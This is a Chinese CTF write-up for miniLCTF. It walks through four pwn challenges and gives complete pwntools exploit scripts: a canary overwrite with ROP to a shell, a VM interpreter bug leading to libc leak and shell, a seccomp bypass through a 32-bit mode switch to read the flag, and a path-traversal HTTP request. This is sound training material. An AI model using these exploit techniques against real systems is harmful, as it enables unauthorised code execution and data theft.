> 某位开始纠结 1/l 0/O 的问题，但是一般 1337 肯定是改字符的多一些啦

# 问卷题 | Hana | done

填完问卷得

`miniLCTF{Th4nk5_F0R_Y0UR_P4rt1c1p4t1ng!}`

---

# Gods | limiter | done
先 checksec，没有 PIE， 其他都有 ida 反编译，发现开局必须输入 yes，于是先输入 yes

之后，发现其调用了一个函数 pthread_create(&pid, 0, vuln, 0) ,根据名字猜测是一个线程创建函数，线程执行 vuln 函数。

设有一个全局变量 edit_times 记录其输入次数，edit_times 值为 2 。

每次输入时，会先要求输入要添加的 god 所在的排名 v2（ RX 必须是第 1 ）， v2 > 1

之后可以输入 7 个字节的数据，数据先填入缓冲区中，再复制到 [rbp-0x40 + v2 - 1] ,此处，可以写一个超大的 v2 ，从而覆盖后面的数据。

考虑到这是一个新建线程，线程在创建时会有一个结构体保存其信息，其中也存有 canary 的值（不如说 canary 的值是从里面取得的）

canary 取自 fs:0x28, 在 gdb 调试中使用 fsbase 查看 fs 寄存器的值，加上 0x28 的偏移即为取的 canary 值的地址，注意此时线程的栈位于一个新开辟的匿名区域，并且该结构体与栈的在同一片区域且偏移固定。

因此，储存 canary 的地址 fs:0x28 与栈的偏移也是固定的，计算出偏移，当 v2 为 272 时可以成功将其覆盖，覆盖为 0xffffffffffffff。

当然，还有一次填写 god 的机会，可以填上自己心中的 god 捏（>_<）

god 填完之后，要输入自己的名字，可以写入 72 个字节，而存储区域仅有 24 字节，最高 8 字节为 canary ，覆盖为改写的 canary
后面的就是写个 gadget 地址（在 __libc_csu_init 里面，把 pop r15 拆开），got 表里面随便一个地址，put 函数地址，（将 libc 的基址算出），再加一个 vuln 函数地址返回 vuln 函数。

注意此时 edit_time 值已经为 0，故不能在添加 god 了，只能直接写自己名字。

canary 是不会变的，也溢出一下，放入'/bin/sh'的地址，再次返回到 gadget ，将其传入 rdi ， 再返回到 system 取得 shell

注意，system 函数中有一条汇编指令会检查栈是否对齐（即 rsp 是否是 0x10 的倍数），这里直接返回到 system 是没有对齐的，返回到一个 ret 指令的地址，再通过 ret 返回 system 就能对齐了
以下为 exp：

```python

#! python3
from pwn import *

#p = process('./gods')
p = remote('pwn.archive.xdsec.chall.frankli.site', 10056)
elf = ELF('./gods')
libc = ELF('./libc-2.31.so')

off_str = next(libc.search(b'/bin/sh'))
off_system = libc.symbols['system']

off_puts = libc.symbols['puts']
got_puts = elf.got['puts']
plt_puts = elf.symbols['puts']

p.recvuntil(b'\n')
p.sendline(b'yes')
p.recvuntil(b'k: ')

payload1 = p8(0xff)*7



p.sendline(b'272')
p.sendline(payload1)

p.recvuntil(b'k: ')

p.sendline(b'2')
p.sendline(b'kkk')


p.recvuntil(b'?\n')

payload2 = b'a'*24 + p8(0xff)*7 + p8(0) + p64(0) + p64(0x4015d3) + p64(got_puts) + p64(plt_puts) + p64(0x40123a)

p.sendline(payload2)

p.recvuntil(b'\n')
addr_puts = p.recv(6)
p.recv(1)
addr_puts = addr_puts + p8(0)*2
addr_puts = u64(addr_puts)
addr_libc = addr_puts - off_puts

addr_str = addr_libc + off_str
addr_system = addr_libc + off_system

payload3 = p64(0)*3 + p8(0xff)*7 + p8(0) + p64(0) + p64(0x4015d3) + p64(addr_str) + p64(0x4015d4) +  p64(addr_system)

p.sendline(payload3)

p.interactive()

```


# minil_bug | limiter | done

checksec 一下， 全部都有，给了一个 dockerfile，运行 dockerfile 后发现报错，仔细一看，里面有两行注释掉的下载命令，下面有两行没注释的解压命令，把解压命令注释掉，下载命令取消注释，即可成功运行。（出题人说他的网不好下载不下来，就搞了个压缩包，结果压缩包忘给了）

下载下来的 simple-virtual-machine-C 里面有源码!!!!!（逆了一天的向发现里面有完整的源码。。。。），当然，源码要用给的 patch 文件 patch 一下才是真源码。

直接查看源码，程序模拟了一台虚拟机，虚拟机具有 push ， pop 等等功能，（暂时不管）

主函数部分先是将虚拟机要执行的 code 读入栈中，注意这里的读取是有漏洞的，每次读入字节，rsp 就会增加已读入总字节数 * 4。

code 只有 128 个字节的空间，但如果读入方式恰当，可以写到 128 * 4 字节处。

当然，读入指令后并创建虚拟机后，虚拟机就会开始执行，虚拟机会按顺序（ 4 byte 一条）执行指令，注意，如果指令的值不在 1 - 18 之间（包括 1 和 18 ），程序会直接退出，因此我们的读入的指令不能轻易断开，否则中间的值如果不满足条件则会引起崩溃。

在储存指令的栈空间查看一下，其栈的布局是这样的：

>0x4                     |   <- code 起始地址

>0x1           |

>0x7ffff7fb7540    |   <-     注意这两个地址，是 ld 和一个匿名数据段的地址， 他们的高 4 字节是相同的，随便泄露一个的低 4 字节

>0x7ffff7ffe160     |   <-     拼接一下就能获得 ld 或者匿名数据段的地址，他们和 libc 的相对偏移是固定的，故想办法泄露他们就能

>0x7fffffffdd01     |            成功获得 libc 基址

>0x7ffff7ffd9e8     |

>0                         |

>4 skip

>。。。。。。。

>canary                 |

>0                         |

>0x7ffff7de80b3    |    <-- libc_start_main + 243    这里是执行函数的返回地址，当我们第一次写入代码时，并不知道 libc 或者主函数

>0x50                    |        地址，由于其也是 libc 函数的地址，只要找一个低 3 十六进制位与其不同，其余相同的 gadget 地址，由于每次

>0x7ffffffffdfe8      |     输入最少一字节，故第四个 16 进制位不能保证一致（会由于随机化改变，低 3 十六进制位不会变），但只有 16

>0x1f7fac7a0         |   种情况，可以爆破。找到的 gadget 地址低 3 十六进制为 6be， pop rax； pop rbx； pop rsi； ret；

>0x55555555d52    |    <-- main          这样跳到 gadget，pop 完成后，返回地址变成了下面的 main，即可成功返回主函数


现在的关键是如何泄露栈上的值，注意到虚拟机的特定指令执行完，会打印该指令下一条或者后两条，或者后三条指令，

虚拟机的指令指针始终指向下一条要执行的指令，再注意到只有 call 指令会打印后三条指令，即 12 个字节，并且 call 指令会跳到该指令下一个位置所指向的指令位置（如下一条是 5，则跳到第五条指令执行）

由于开始读入指令便有很大限制，故需要构造一种特殊读入方式来布局栈

1:iadd (就是占下格子，随便其他不影响执行的指令都行)          16: call      

1.写入 p8(1),会将 0x4 覆盖为 0x1，由于只写入了一个字节，下一条指令写在 code[1] 处

2.写入 p8(16)，由于这四个字节是零，也只用写一个字节覆盖低位 0x0 ，下一条指令写在 code[2] 处

3.写入 p8(6), 会将 0x1 覆盖为 0x6，写了一个字节，下一条指令写在 code[3] 处

4.写入 p8(0)*3 ,对栈上的值不会有影响，但下一条指令写在 code[6] 处（写到这里突然发现可以直接读一个完整的值，还不用构造读入方式。。。。。。。感觉自己好傻逼）

5.写入 p32(16) + p32(18) + p32(0)，因为原来栈中四个字节都有值，只能全部覆盖，此时下一条指令写在 code[18] 处

6.写入 p32(18) ,执行完这条指令虚拟机就会退出了，此时下一条指令写在 code[22] 处

7.直接写入 122*b'a'， 下一条指令写在返回地址处

8.写入 p8(0xbe) + p8(0xc6)，c 会随每次启动程序而改变，故要多试几次

9.接下来后面全部写 0 就行了

执行完成后可泄露栈中的地址，可计算 libc 基址，同时返回到了 main 函数，又会再次执行虚拟机，此时执行我们直接写入 p32(18)+130*

b'a' 直接跳到返回地址处写入，由于开始就写了 p32(18) ,虚拟机会直接停止执行并返回

接下来就是写入 libc 中的 gadget 地址到返回地址处，再写入'/bin/sh'地址和 system 地址就行了

当然这里栈恰好是对齐的，就不用再多返回一次啦。

以下是 exp：

```python

#! python3
from pwn import *
from struct import *
context.log_level = "debug"

libc = ELF('./libc-2.31')
off_system = libc.symbols['system'] - 0x22000
off_str = next(libc.search(b'/bin/sh')) - 0x22000
off_gadget = 0x15379d - 0x22000


#p = process('./bugged_interpreter')
#p = remote('172.17.0.2', 9999)
p = remote('pwn.archive.xdsec.chall.frankli.site',10076)
p.recvuntil(b'\n')

payload1 = p8(1)
payload2 = p8(16)
payload3 = p8(6)
payload4 = p8(0) +p8(0) + p8(0)
payload5 = p32(16) + p32(18) + p32(0)
payload6 = p32(18)
payload7 = 112 * b'a'
payload8 = p8(0xbe) + p8(0xc6)
payload9 = p64(0) + p64(0) + p64(0)
payload10 = 352*p8(0)


p.send(payload1)
sleep(0.3)
p.send(payload2)
sleep(0.3)
p.send(payload3)
sleep(0.3)
p.send(payload4)
sleep(0.3)
p.send(payload5)
sleep(0.3)
p.send(payload6)
sleep(0.3)
p.send(payload7)
sleep(0.3)
p.send(payload8)
sleep(0.3)
p.send(payload9)
sleep(0.3)
p.send(payload10)





p.recvuntil(b'0,')
addr_lo = p.recvuntil(b's')
addr_lo = addr_lo.strip()
addr_lo = addr_lo.strip(b's')
addr_lo = addr_lo.strip()

p.recvuntil(b'0,')
addr_hi = p.recvuntil(b's')
addr_hi = addr_hi.strip(b's')
addr_hi = addr_hi.strip()

addr_lo = addr_lo.decode()
print(addr_lo)
addr_lo = int(addr_lo)
addr_lo = pack('i', addr_lo)
addr_hi = addr_hi.decode()
print(addr_hi)
addr_hi = int(addr_hi)
addr_hi = pack('i', addr_hi)
addr = addr_lo + addr_hi
addr = u64(addr)
addr_libc = addr - 0x211700 + 0xb000 + 0x2000
print(hex(addr_libc))



sleep(1)

payload11 = p32(18) + 130*b'a'

addr_gadget = off_gadget + addr_libc
addr_system = off_system + addr_libc
addr_str = off_str + addr_libc

payload12 = p64(addr_gadget) + p64(addr_str) + p64(addr_system)

payload13 = 354 * p8(0)
p.recvuntil(b'e:\n')

sleep(1)
p.send(payload11)
sleep(0.3)
p.send(payload12)
sleep(0.3)
p.send(payload13)

p.interactive()


```

当然，bb 的标准答案 exp 更完美，也贴上：

```python

from pwn import *
context.log_level = 'debug'
# context.terminal = ['tmux', "new-window"]
one_gadgets = [0, 3, 6, 501, 504]
# p = process('./svme1')
# p = remote('1.117.139.210', 9601)
code2int = {'noop': 0, 'iadd': 1, 'isub': 2, 'imul': 3, 'ilt': 4, 'ieq': 5, 'br': 6, 'brt': 7,
            'brf': 8, 'iconst': 9, 'load': 10, 'gload': 11, 'store': 12, 'gstore': 13, 'print': 14,
            'pop': 15, 'call': 16, 'ret': 17, 'halt': 18}

code_place = {"noop": 0, "iadd": 0, "isub": 0, "imul": 0, "ilt": 0, "ieq": 0, "br": 1, "brt": 1,
              "brf": 1, "iconst": 1, "load": 1, "gload": 1, "store": 1, "gstore": 1, "print": 0,
              "pop": 0, "call": 3, "ret": 0, "halt": 0}


def generate_code(bytecode):
    bytecode = bytecode.split()
    for i in range(len(bytecode)):
        if bytecode[i] in code2int.keys():
            bytecode[i] = code2int[bytecode[i]]
        else:
            bytecode[i] = int(bytecode[i])
    code = b""
    for i in bytecode:
        code = code + p32(i)
    return code


def pwn():
    # p = process('./svme', env={'LD_PRELOAD': './libc-2.31.so'})
    p = remote('pwn.archive.xdsec.chall.frankli.site', 10089)
    code = f'''
    call 4 7 0
    load 6
    load 5
    load 4
    load 3
    load 6
    iconst 4294967248
    iadd
    load 5
    load 0
    gload 147
    gload 146
    iconst 4294965951
    iadd
    gstore 2
    gstore 3
    gload 147
    gload 146
    iconst 1639690
    iadd
    gstore 4
    gstore 5
    gload 147
    gload 146
    iconst 4294965952
    iadd
    gstore 6
    gstore 7
    gload 147
    gload 146
    iconst 188941
    iadd
    gstore 8
    gstore 9
    halt
    '''
    code = generate_code(code)
    code = code + b'\x00'*(512-len(code))
    # gdb.attach(p, "b *$rebase(0x12f6)\nb*$rebase(5029)")
    # input()
    p.sendline(code)
    p.interactive()

if name == 'main':
    pwn()

```

# shellcode | limiter | done

checksec 一下， 全开 ida 看一下文件，发现开局就能在一片区域写入可执行代码，并且跳转过去执行。

直接写入 shellcode，报错 bad system call，百度，是运用了沙箱，限制了系统调用，用工具查看，是一个白名单，仅能调用 sys_write, sys_read, sys_fstat,和 sys_mmap获得 shell 基本不可能了，考虑直接读出 flag 的值，注意没有 sys_open,但 sys_fstat 在 64 位下的系统调用号是 5，seccomp 这里的白名单只会根据系统调用号来限制系统调用， 而 5 号在 32 位下恰好是 sys_open，因此可以先跳到 32 位下调用 sys_open 打开文件，再返回 64 位打印文件值，64 位跳 32 位指令是 retfq， 32 位返回 64 位指令是 retf， 在切换之前， 要在栈中传入跳转到的地址和标识符（ 0x23 表示 32 位，0x33 表示 64 位），由于原来的代码段地址和栈地址都超过了 32 位，因此我们应该在一片低内存区域写入 shellcode ，再在 32 位下执行，调用 sys_mmap 可为我们分配这低地址空间。（注意打开文件只能以只读的方式打开，否则由于远程服务器上权限不足会失败，而本地权限足够就能成功）

以下是 exp:

```python
#! python3
from pwn import *




shellcode2 = '''
mov esp, 0x8048400;
mov ebp, esp;
push ebp;
mov eax,0;
push eax;
mov eax, 0x67616c66;
push eax;
mov ebx, 0;
add ebx, esp;
mov  ecx, 0;
mov eax, 5;
int 0x80;
mov ebp, eax;
mov eax, 0x33;
push eax;
mov eax, 0x8048040;
push eax;
retf;
nop;
nop;
nop;
nop;
nop;
nop;
nop;
nop;
nop;
nop;
nop;
nop;
nop;
nop;
nop;
'''

shellcode2 = asm(shellcode2)


#p = process('./shellcode')
p = remote('pwn.archive.xdsec.chall.frankli.site', 10019)
#p = remote('172.17.0.2', 6666)
shellcode1 = '''
mov rsi, 0x100;
mov rdi, 0x8048000;
mov edx, 7;
mov ecx, 0x22;
mov r8d, 0xffffffff;
mov r9d, 0;
mov rax, 9;
syscall;
mov rdi, 0;
mov rsi, 0x8048000;
mov rdx, 0x200;
mov rax, 0;
syscall;
mov rax, 0x23;
push rax;
mov rax, 0x8048000;
push rax;
retfq;
nop;
nop;
nop;
nop;
nop;
'''

shellcode1 = asm(shellcode1, arch = 'amd64')

shellcode3 = '''
mov rdi, 0;
mov rdi, rbp;
mov rsi, rsp;
mov rdx, 0x60;
mov rax, 0;
syscall;
mov rdx, 0x60;
mov rdi, 1;
mov rax, 1;
syscall;
'''
shellcode3= asm(shellcode3, arch = 'amd64')
shellcode2 = shellcode2 + shellcode3
p.send(shellcode1)
sleep(0.5)
p.send(shellcode2)
flag = p.recv(0x60)
print(flag)

```

# Easy HTTPd | limiter | done

文件会在一个端口监听接收数据，并对收的数据有要求，最后会把 GET 后面的路径用 open 打开并且打印其中的值，但假如路径
为/home/minl/flag 则不会 open 并打印，传入的路径改为/home/../home/minl/flag 则能绕过检查，直接获得 flag

以下为 exp：

```python

#! python3
from pwn import *
#p = remote('172.17.0.2', 2048)
p = remote('pwn.archive.xdsec.chall.frankli.site',10084)
sleep(1)

payload = b'GET /home/../home/minil/flag\r\nUser-Agent: MiniL\r\n\r\n'
p.send(payload)
a = p.recv(50)
print(a)

```
